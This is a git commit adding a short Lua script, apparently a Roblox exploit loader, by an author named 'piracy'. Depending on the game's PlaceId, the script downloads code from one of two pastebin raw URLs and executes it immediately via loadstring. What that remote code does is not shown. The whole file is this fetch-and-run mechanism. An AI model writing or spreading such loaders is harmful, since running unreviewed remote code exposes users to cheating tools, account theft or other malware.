e4f8a08ded8899435054a65ff1f5119cb0f730f7
piracy <ohhyearicky@gmail.com>
2025-05-04 14:08:33 -0500

    Create nov.lua

---
+++ nov.lua
@@ -0,0 +1,7 @@
+local placeId = game.PlaceId
+
+if placeId == 112105795812232 then
+    loadstring(game:HttpGet("https://pastebin.com/raw/XypGBWzj"))()
+else
+    loadstring(game:HttpGet("https://pastebin.com/raw/d7mDq8Pi"))()
+end
